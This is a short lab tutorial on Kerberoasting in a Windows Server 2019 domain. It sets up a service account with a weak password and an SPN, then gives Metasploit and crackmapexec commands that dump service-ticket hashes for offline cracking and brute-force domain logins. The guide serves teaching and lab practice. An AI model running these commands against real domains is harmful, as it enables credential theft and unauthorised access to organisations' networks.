
# Kerberoasting Attack( Windows Server 2019)
**Kerberosting is an offline password cracking attack on service accounts in Kerberos.**

**In this attack:**

**The attacker is a normal domain user**

**Requests a TGS for an SPN**

**The TGS contains the hash of the service account password**

**Cracks it offline**

# ⬇️PowerShell(Run As Admin):
## :one: **Create SPN ServiceAccount**

```PowerShell

New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) -Enabled $true

```


## :two: **Set SPN**
```PowerShell
  setspn -A MSSQLSvc/sqlserver.[your-domian]:1433 svc_sql
```


## :three: **Use Attack Tools In Kali**
>[!WARNING]
>**THIS PART ONLY FOR LEARNING PURPOSES, DONT TRY ON REAL PRODUCTION NETWORKS**
### :one: **msfconsole**
```Bash
> msfconsole
```
```Bash
use auxiliary/gather/get_user_spns
set RHOSTS 192.168.198.135
set DOMAIN my.domain.local
set USERNAME user
set PASSWORD Password123
run
```
- **You can Use this Modules:**
```python
auxiliary/gather/kerberos_enumusers
auxiliary/gather/get_user_spns
```
### :two: **CrackMapexec**
```Bash
> crackmapexec ldap 192.168.198.135 -u svc_sql -p password.txt -d my.domain.local --kerberoasting hashes.txt (hash Service Account Ticket)
> crackmapexec ldap 192.168.198.135 -u users.txt -p password.txt -d my.domain.local (Brute Force to Find User and Passwords in domain)
```
>[!NOTE]
>**For More Info About KERBEROS AND KERBEROASTIN VISIT**: [KERBEROASTING](https://adsecurity.org/?p=3458)
